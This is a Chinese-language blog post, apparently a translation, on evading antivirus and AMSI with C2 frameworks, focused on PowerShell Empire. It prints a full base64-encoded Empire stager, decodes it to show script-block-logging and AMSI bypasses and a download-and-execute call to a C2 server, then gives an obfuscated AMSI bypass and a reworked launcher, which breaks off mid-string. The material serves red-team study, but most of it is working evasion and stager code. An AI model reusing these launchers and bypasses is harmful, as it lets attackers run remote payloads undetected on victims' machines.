Powershell <a href="https://github.com/BC-SECURITY/Empire">Empire</a>，这是我在从事安全职业生涯中第一次接触 C2-Frameworks。</p><div class="tip "><p>提示：Empire 3 是一个后来开发的框架，因为它是之前的 PowerShell Empire 和 Python EmPyre 项目的合并，包括纯 PowerShell Windows 代理，并与 Python 3.x Linux/OS X 代理兼容。该框架提供了密码安全的通信和灵活的结构。</p></div><p>第二部分将介绍 <a href="https://github.com/n1nj4sec/pupy">Pupy</a>，它具有一些非常独特的模块和特性。</p><div class="tip "><p>提示：Pupy 主要是使用 Python 编写的跨平台，多功能 RAT 工具。它具有全内存执行准则，并且占用空间极小。Pupy 可以使用多种传输方式进行通信，可以使用反射注入到进程中，还可以从内存中远程加载 Python 代码，Python 包和 Python C 扩展。</p></div><p>最后，但并不是最重要的是，我将会写关于我的 Covenant 方法。</p><p>因此，让我们直接进入吧！</p><h2 id="Powershell-Empire"><a href="#Powershell-Empire" class="headerlink" title="Powershell Empire"></a>Powershell Empire</h2><p><a href="https://github.com/BC-SECURITY">BC-Security</a> 在 Empire 的方方面面 (更新、维护等) 做得非常出色。感觉每周都会在框架中实现新的功能和改进。 Powershell Empire 有许多好处，因此值得使用该框架。我个人认为最重要的是：</p><ul><li>有很多模块，涉及提权，横向移动，域枚举，凭证收集，持久性等等；</li><li>易于使用的 CLI，到目前为止，我还没有使用 <a href="https://github.com/BC-SECURITY/Starkiller">Starkiller</a> GUI；</li><li>非常稳定，代理可以存活，几乎很少发生崩溃；</li><li>易于修改以及可集成定制模块；</li></ul><div class="tip "><p>提示：Starkiller 是 Powershell Empire 的前端。它是用 VueJS 编写的 Electron 应用程序。</p></div><p>我认为最常用的默认 HTTP-Listener 选项如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Listener.jpg" alt=""></p><p>如果我们保留默认选项，请设置侦听端口并启动侦听器，我们可以在 Powershell 或 Python 启动器进行选择。Python 启动器用于 linux 代理，这我不会深入探讨。具有默认选项的 Powershell 启动器如下所示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell <span class="literal">-noP</span> <span class="literal">-sta</span> <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-enc</span> SQBmACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBlAFIAUwBJAG8ATgAuAE0AQQBKAE8AUgAgAC0ARwBFACAAMwApAHsAJABjADMAMgAyAD0AWwByAEUAZgBdAC4AQQBzAFMARQBNAGIATABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAGMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAYwAzADIAMgAuAEcARQBUAFYAQQBMAFUAZQAoACQATgB1AEwATAApADsASQBmACgAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBBAEwAPQBbAEMAbwBsAGwAZQBDAFQASQBvAG4AUwAuAEcARQBOAGUAcgBJAGMALgBEAEkAYwB0AGkATwBOAEEAUgB5AFsAUwB0AHIASQBOAGcALABTAFkAUwB0AEUAbQAuAE8AYgBKAGUAQwBUAF0AXQA6ADoAbgBlAHcAKAApADsAJABWAEEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAEwAUwBlAHsAWwBTAEMAcgBpAFAAdABCAEwAbwBjAGsAXQAuACIARwBFAFQARgBpAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUAZQAoACQATgB1AEwAbAAsACgATgBFAHcALQBPAEIAagBFAEMAVAAgAEMATwBMAEwAZQBDAFQASQBvAG4AUwAuAEcARQBOAGUAUgBJAGMALgBIAEEAUwBIAFMAZQBUAFsAUwB0AFIAaQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBTAFMAZQBtAGIAbABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAEYALgBHAEUAdABGAGkARQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBsAHUAZQAoACQATgB1AEwAbAAsACQAdABSAHUAZQApADsAfQA7AFsAUwBZAFMAVABlAE0ALgBOAGUAVAAuAFMAZQByAHYASQBDAEUAUABvAEkATgB0AE0AYQBOAEEAZwBlAFIAXQA6ADoARQB4AFAAZQBDAHQAMQAwADAAQwBvAG4AVABpAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4ARQB3AC0ATwBCAGoARQBDAHQAIABTAHkAcwBUAGUAbQAuAE4AZQBUAC4AVwBFAEIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBPAGQAaQBOAGcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQBUAFMAVAByAEkAbgBHACgAWwBDAG8AbgB2AGUAUgB0AF0AOgA6AEYAcgBvAE0AQgBBAFMARQA2ADQAUwB0AHIASQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAawBBAE0AZwBBAHUAQQBEAEUAQQBOAGcAQQA0AEEAQwA0AEEATQBRAEEAdwBBAEQAQQBBAEwAZwBBAHgAQQBEAE0AQQBNAFEAQQA2AEEARABnAEEATQBBAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAcgBPAFgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAGUAVAAuAFcARQBCAFIARQBxAHUAZQBzAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAHIATwBYAHkAOwAkADUANwA5ADMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AEkAYQBsAHMAIAA9ACAAWwBTAFkAUwB0AEUAbQAuAE4ARQB0AC4AQwBSAGUAZABFAG4AVABpAEEATABDAEEAYwBIAGUAXQA6ADoARABlAEYAQQB1AEwAdABOAGUAdAB3AG8AcgBrAEMAcgBFAEQAZQBOAFQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAUwB0AEUATQAuAFQAZQB4AFQALgBFAG4AQwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBTACgAJwBHAGUAWABTAFoAbwApAHQARAAyADsAfQBDACwAUgBmADkAWQBqAEoANgBWAF0AewB2AE8AZAAlAEkARQAmACgAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABlAGEARABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBBAGEAcgBVAHEAagBhAFAAVwBBAFYATgA9AE8AYgBSAHMAQwAyAFYAUAB1ADAAcgBWAHIAcwAyADYASQBSACsAMAAxAGUANQBXAGsALwB3AD0AIgApADsAJABkAGEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcATgBsAE8AYQBkAEQAQQB0AGEAKAAkAFMARQBSACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQARABBAHQAYQBbADQALgAuACQAZABBAHQAYQAuAEwAZQBOAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA</span><br></pre></td></tr></table></figure><p>在安装了 AV 软件的 Windows 系统上执行此启动器很可能会导致进程阻塞和弹出 AV 消息。有以下原因之一：</p><ul><li>许多 AV 供应商都具有这么一个模块，这个模块可以阻止生成带有 <code>-noP -sta -w1 -enc</code> 参数的新 Powershell 进程 —— 脚本内容本身目前尚不完善，所有内容均被阻止；</li><li>使用 AMSI 并阻止 BASE64 编码的脚本内容；</li></ul><p><code>-noP -sta -w1 -enc</code> 参数中的 <code>-noP</code> 表示不加载当前用户的配置文件；<code>-sta</code> 表示的是使用单线程单元来启动 Powershell；<code>-w1</code> 表示的是设置会话窗口样式，此处为隐藏窗口被打开；<code>-enc</code> 表示的是允许传入一个 base64 编码过的字符串。仅使用这些参数之一就可能会阻止通过 AV 模块执行。为了绕开，对源代码修改更是于事无补。但是你可以避免使用这些参数，而是执行解码后的脚本。</p><div class="tip "><p>提示：更多参数可详见 <a href="https://docs.microsoft.com/de-de/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1">https://docs.microsoft.com/de-de/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1</a></p></div><p>现在，我们将使用命令 <code>echo “Base64Content” | base64</code> 对启动程序的内容进行解码。base64 -d 看看，Empire 在这里到底在做什么。base64 解码的内容看起来像这样，为了更好地了解，我用换行符替换了一些分号：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">If</span>(<span class="variable">$PSVerSIonTAbLE</span>.PSVeRSIoN.MAJOR <span class="operator">-GE</span> <span class="number">3</span>)&#123;<span class="variable">$c322</span>=[<span class="type">rEf</span>].AsSEMbLY.GetTypE(<span class="string">&#x27;System.Management.Automation.Utils&#x27;</span>).<span class="string">&quot;GEtFie`LD&quot;</span>(<span class="string">&#x27;cachedGroupPolicySettings&#x27;</span>,<span class="string">&#x27;N&#x27;</span>+<span class="string">&#x27;onPublic,Static&#x27;</span>)</span><br><span class="line"><span class="keyword">IF</span>(<span class="variable">$c322</span>)&#123;<span class="variable">$c742</span>=<span class="variable">$c322</span>.GETVALUe(<span class="variable">$NuLL</span>)</span><br><span class="line"><span class="keyword">If</span>(<span class="variable">$C742</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>])&#123;<span class="variable">$c742</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>][<span class="string">&#x27;EnableScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>]=<span class="number">0</span>;<span class="variable">$c742</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>][<span class="string">&#x27;EnableScriptBlockInvocationLogging&#x27;</span>]=<span class="number">0</span>&#125;<span class="variable">$VAL</span>=[<span class="type">ColleCTIonS.GENerIc.DIctiONARy</span>[<span class="built_in">StrINg</span>,<span class="type">SYStEm.ObJeCT</span>]]::new()</span><br><span class="line"><span class="variable">$VAL</span>.ADd(<span class="string">&#x27;EnableScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"><span class="variable">$Val</span>.AdD(<span class="string">&#x27;EnableScriptBlockInvocationLogging&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"><span class="variable">$c742</span>[<span class="string">&#x27;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>]=<span class="variable">$val</span>&#125;<span class="keyword">ELSe</span>&#123;[<span class="type">SCriPtBLock</span>].<span class="string">&quot;GETFie`Ld&quot;</span>(<span class="string">&#x27;signatures&#x27;</span>,<span class="string">&#x27;N&#x27;</span>+<span class="string">&#x27;onPublic,Static&#x27;</span>).SETVALUe(<span class="variable">$NuLl</span>,(<span class="built_in">NEw-OBjECT</span> COLLeCTIonS.GENeRIc.HASHSeT[<span class="built_in">StRiNg</span>]))&#125;<span class="variable">$Ref</span>=[<span class="type">REF</span>].ASSemblY.GeTTYpe(<span class="string">&#x27;System.Management.Automation.Amsi&#x27;</span>+<span class="string">&#x27;Utils&#x27;</span>)</span><br><span class="line"><span class="variable">$REF</span>.GEtFiELD(<span class="string">&#x27;amsiInitF&#x27;</span>+<span class="string">&#x27;ailed&#x27;</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).SETVAlue(<span class="variable">$NuLl</span>,<span class="variable">$tRue</span>);&#125;</span><br><span class="line">[<span class="type">SYSTeM.NeT.ServICEPoINtMaNAgeR</span>]::ExPeCt100<span class="keyword">ConTinUE</span>=<span class="number">0</span>;<span class="variable">$5793</span>=<span class="built_in">NEw-OBjECt</span> SysTem.NeT.WEBClIeNt</span><br><span class="line"><span class="variable">$u</span>=<span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span></span><br><span class="line"><span class="variable">$ser</span>=<span class="variable">$</span>([<span class="type">TeXt.ENCOdiNg</span>]::UNicODe.GETSTrInG([<span class="type">ConveRt</span>]::FroMBASE64StrING(<span class="string">&#x27;aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgAxADMAMQA6ADgAMAA=&#x27;</span>)))</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&#x27;/login/process.php&#x27;</span>;<span class="variable">$5793</span>.HEADErs.Add(<span class="string">&#x27;User-Agent&#x27;</span>,<span class="variable">$u</span>)</span><br><span class="line"><span class="variable">$5793</span>.PrOXY=[<span class="type">SysTeM.NeT.WEBREquest</span>]::DeFaULtWEBPrOXy;<span class="variable">$5793</span>.Proxy.CredentIals = [<span class="type">SYStEm.NEt.CRedEnTiALCAcHe</span>]::DeFAuLtNetworkCrEDeNTIals</span><br><span class="line"><span class="variable">$Script:Proxy</span> = <span class="variable">$5793</span>.Proxy;<span class="variable">$K</span>=[<span class="type">SyStEM.TexT.EnCodiNG</span>]::ASCII.GEtByTES(<span class="string">&#x27;GeXSZo)tD2;&#125;C,Rf9YjJ6V]&#123;vOd%IE&amp;(&#x27;</span>)</span><br><span class="line"><span class="variable">$R</span>=&#123;<span class="variable">$D</span>,<span class="variable">$K</span>=<span class="variable">$ArgS</span>;<span class="variable">$S</span>=<span class="number">0</span>..<span class="number">255</span>;<span class="number">0</span>..<span class="number">255</span>|%&#123;<span class="variable">$J</span>=(<span class="variable">$J</span>+<span class="variable">$S</span>[<span class="variable">$_</span>]+<span class="variable">$K</span>[<span class="variable">$_</span>%<span class="variable">$K</span><span class="type">.CoUNt</span>])%<span class="number">256</span>;<span class="variable">$S</span>[<span class="variable">$_</span>],<span class="variable">$S</span>[<span class="variable">$J</span>]=<span class="variable">$S</span>[<span class="variable">$J</span>],<span class="variable">$S</span>[<span class="variable">$_</span>]&#125;;<span class="variable">$D</span>|%&#123;<span class="variable">$I</span>=(<span class="variable">$I</span>+<span class="number">1</span>)%<span class="number">256</span>;<span class="variable">$H</span>=(<span class="variable">$H</span>+<span class="variable">$S</span>[<span class="variable">$I</span>])%<span class="number">256</span>;<span class="variable">$S</span>[<span class="variable">$I</span>],<span class="variable">$S</span>[<span class="variable">$H</span>]=<span class="variable">$S</span>[<span class="variable">$H</span>],<span class="variable">$S</span>[<span class="variable">$I</span>]</span><br><span class="line"><span class="variable">$_</span><span class="operator">-bXoR</span><span class="variable">$S</span>[(<span class="variable">$S</span>[<span class="variable">$I</span>]+<span class="variable">$S</span>[<span class="variable">$H</span>])%<span class="number">256</span>]&#125;&#125;;<span class="variable">$5793</span>.HeaDeRs.ADD(<span class="string">&quot;Cookie&quot;</span>,<span class="string">&quot;AarUqjaPWAVN=ObRsC2VPu0rVrs26IR+01e5Wk/w=&quot;</span>)</span><br><span class="line"><span class="variable">$daTa</span>=<span class="variable">$5793</span>.DowNlOadDAta(<span class="variable">$SER</span>+<span class="variable">$T</span>);<span class="variable">$iv</span>=<span class="variable">$daTa</span>[<span class="number">0</span><span class="type">..3</span>];<span class="variable">$DATa</span>=<span class="variable">$DAta</span>[<span class="number">4</span><span class="type">..</span><span class="variable">$dAta</span><span class="type">.LeNgth</span>];<span class="operator">-join</span>[<span class="built_in">ChAr</span>[]](&amp; <span class="variable">$R</span> <span class="variable">$dATa</span> (<span class="variable">$IV</span>+<span class="variable">$K</span>))|<span class="built_in">IEX</span></span><br></pre></td></tr></table></figure><p>如果 Powershell 版本为 2 或更低的话，则根本不会执行启动器的很大一部分。那是因为 Powershell v2 没有 AMSI 和脚本块记录日志支持。在 if 语句之间，各个保护机制有不同的 bypass，一个脚本块日志记录 bypass 和一个 AMSI bypass。</p><p>你可以在 Empire 的 lib/common/bypasses.py 文件中修改任何 Empire bypass：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Bypasses_py.jpg" alt=""></p><p>如果你想知道如何创建自己的自定义 bypass，建议你来阅读我较早写的一篇 Blog -&gt; <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">Post Bypass AMSI by manual modification</a>。</p><p>让我们再次使用 <a href="https://github.com/RythmStick/AMSITrigger/tree/master/AMSITrigger">AMSITrigger</a> 查找我们的 Empire 启动器的 AMSI 触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/AMSITriggerBase64.jpg" alt=""></p><p>在命令行下，用触发器处理这些 base64 很容易，因为 base64 签名无效，它只是完整 base64 字符串的一部分。但是，例如将 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 与 From Base64 配合使用：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/CyberChef.jpg" alt=""></p><p>这确实是 AMSI bypass，它是第一个触发器。</p><p>我们将使用一个 <a href="https://amsi.fail/">Amsi.fail</a> Payload 来创建具有自定义签名的现有 bypass：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Matt Graebers Reflection method </span></span><br><span class="line">[<span class="type">Ref</span>].AsSEMbly.GeTtype(<span class="string">&#x27;System.Management.Automation.&#x27;</span>+<span class="variable">$</span>([<span class="type">SYsTeM.NET.weButIlity</span>]::HTmLDEcodE(<span class="string">&#x27;&amp;#65;&amp;#109;&amp;#115;&amp;#105;&#x27;</span>))+<span class="string">&#x27;Utils&#x27;</span>).GetField(<span class="string">&#x27;&#x27;</span>+<span class="variable">$</span>([<span class="built_in">CHAr</span>]([<span class="built_in">BYTe</span>]<span class="number">0</span>x61)+[<span class="built_in">chAR</span>](<span class="number">81</span>+<span class="number">28</span>)+[<span class="built_in">char</span>](<span class="number">211</span><span class="literal">-96</span>)+[<span class="built_in">cHaR</span>](<span class="number">149</span><span class="literal">-44</span>))+<span class="string">&#x27;InitFailed&#x27;</span>,<span class="variable">$</span>([<span class="built_in">CHaR</span>]([<span class="built_in">byTe</span>]<span class="number">0</span>x4E)+[<span class="built_in">ChAr</span>](<span class="number">198</span><span class="literal">-87</span>)+[<span class="built_in">CHaR</span>](<span class="number">1980</span>/<span class="number">18</span>)+[<span class="built_in">CHAR</span>](<span class="number">77</span>+<span class="number">3</span>)+[<span class="built_in">ChAr</span>]([<span class="built_in">Byte</span>]<span class="number">0</span>x75)+[<span class="built_in">CHar</span>](<span class="number">5684</span>/<span class="number">58</span>)+[<span class="built_in">cHAR</span>]([<span class="built_in">BYte</span>]<span class="number">0</span>x6C)+[<span class="built_in">ChAR</span>]([<span class="built_in">BYtE</span>]<span class="number">0</span>x69)+[<span class="built_in">ChaR</span>]([<span class="built_in">BYTE</span>]<span class="number">0</span>x63)+[<span class="built_in">chAR</span>]([<span class="built_in">bYtE</span>]<span class="number">0</span>x2C)+[<span class="built_in">ChAR</span>]([<span class="built_in">Byte</span>]<span class="number">0</span>x53)+[<span class="built_in">cHAR</span>](<span class="number">116</span>)+[<span class="built_in">ChAR</span>](<span class="number">97</span>)+[<span class="built_in">chaR</span>]([<span class="built_in">BytE</span>]<span class="number">0</span>x74)+[<span class="built_in">Char</span>](<span class="number">68</span>+<span class="number">37</span>)+[<span class="built_in">cHAr</span>](<span class="number">78</span>+<span class="number">21</span>))).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>);</span><br></pre></td></tr></table></figure><p>你可以将网站上的新 AMSI bypass 复制粘贴到 lib/common/bypasses.py 的 bypass 变量中。但是取决于 bypass，你可能必须转义一些特殊字符。</p><p>第二个触发器用于与 C2-Framework 的 HTTP 连接：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/CyberChef2.jpg" alt=""></p><p>我们可以看到，来自侦听器选项菜单的 User-Agent，C2-Server 的 base64 编码的 IP 地址，连接的 URL 和被 AMSI 标记的代理设置，因此，让我们在监听器菜单中更改 User-Agent 和 URL 的值：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/DefaultProfile.jpg" alt=""></p><p>新的启动器代码比如像下面这样：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell <span class="literal">-enc</span> SQBGACgAJABQAFMAVgBFAHIAcwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAE8AbgAuAE0AQQBqAG8AUgAgAC0AZwBlACAAMwApAHsAWwBSAGUAZgBdAC4AQQBzAFMARQBNAGIAbAB5AC4ARwBlAFQAdAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACcAKwAkACgAWwBTAFkAcwBUAGUATQAuAE4ARQBUAC4AdwBlAEIAdQB0AEkAbABpAHQAeQBdADoAOgBIAFQAbQBMAEQARQBjAG8AZABFACgAJwAmACMANgA1ADsAJgAjADEAMAA5ADsAJgAjADEAMQA1ADsAJgAjADEAMAA1ADsAJwApACkAKwAnAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnACcAKwAkACgAWwBDAEgAQQByAF0AKABbAEIAWQBUAGUAXQAwAHgANgAxACkAKwBbAGMAaABBAFIAXQAoADgAMQArADIAOAApACsAWwBjAGgAYQByAF0AKAAyADEAMQAtADkANgApACsAWwBjAEgAYQBSAF0AKAAxADQAOQAtADQANAApACkAKwAnAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACQAKABbAEMASABhAFIAXQAoAFsAYgB5AFQAZQBdADAAeAA0AEUAKQArAFsAQwBoAEEAcgBdACgAMQA5ADgALQA4ADcAKQArAFsAQwBIAGEAUgBdACgAMQA5ADgAMAAvADEAOAApACsAWwBDAEgAQQBSAF0AKAA3ADcAKwAzACkAKwBbAEMAaABBAHIAXQAoAFsAQgB5AHQAZQBdADAAeAA3ADUAKQArAFsAQwBIAGEAcgBdACgANQA2ADgANAAvADUAOAApACsAWwBjAEgAQQBSAF0AKABbAEIAWQB0AGUAXQAwAHgANgBDACkAKwBbAEMAaABBAFIAXQAoAFsAQgBZAHQARQBdADAAeAA2ADkAKQArAFsAQwBoAGEAUgBdACgAWwBCAFkAVABFAF0AMAB4ADYAMwApACsAWwBjAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgAMgBDACkAKwBbAEMAaABBAFIAXQAoAFsAQgB5AHQAZQBdADAAeAA1ADMAKQArAFsAYwBIAEEAUgBdACgAMQAxADYAKQArAFsAQwBoAEEAUgBdACgAOQA3ACkAKwBbAGMAaABhAFIAXQAoAFsAQgB5AHQARQBdADAAeAA3ADQAKQArAFsAQwBoAGEAcgBdACgANgA4ACsAMwA3ACkAKwBbAGMASABBAHIAXQAoADcAOAArADIAMQApACkAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFMAZQByAFYAaQBjAGUAUABvAEkAbgBUAE0AQQBOAEEARwBlAFIAXQA6ADoARQBYAHAAZQBDAFQAMQAwADAAQwBPAG4AdABpAE4AdQBFAD0AMAA7ACQAYgAzADkAMAA0AD0ATgBlAHcALQBPAEIAagBFAEMAVAAgAFMAWQBTAFQAZQBtAC4ATgBFAHQALgBXAGUAQgBDAGwASQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAwAC4AMAA7ACAAVwBpAG4ANgA0ADsAIAB4ADYANAA7ACAAcgB2ADoANwAwAC4AMAApACAARwBlAGMAawBvAC8AMgAwADEAMAAwADEAMAAxACAARgBpAHIAZQBmAG8AeAAvADcAMAAuADAAJwA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBOAEMATwBEAGkAbgBHAF0AOgA6AFUATgBJAEMAbwBkAEUALgBHAGUAdABTAFQAUgBpAE4AZwAoAFsAQwBPAE4AdgBFAHIAVABdADoAOgBGAHIAbwBNAEIAYQBTAEUANgA0AFMAdABSAEkATgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAGsAQQBNAGcAQQB1AEEARABFAEEATgBnAEEANABBAEMANABBAE0AUQBBAHcAQQBEAEEAQQBMAGcAQQB4AEEARABNAEEATQBRAEEANgBBAEQAZwBBAE0AQQBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBfAGwAYQB5AG8AdQB0AHMALwAxADUALwBxAHUAaQBjAGsAbABpAG4AawBzAGQAaQBhAGwAbwBnAGYAbwByAG0ALgBhAHMAcAB4AD8AUABpAGMAawBlAHIARABpAGEAbABvAGcAVAB5AHAAZQA9AE0AaQBjAHIAbwBz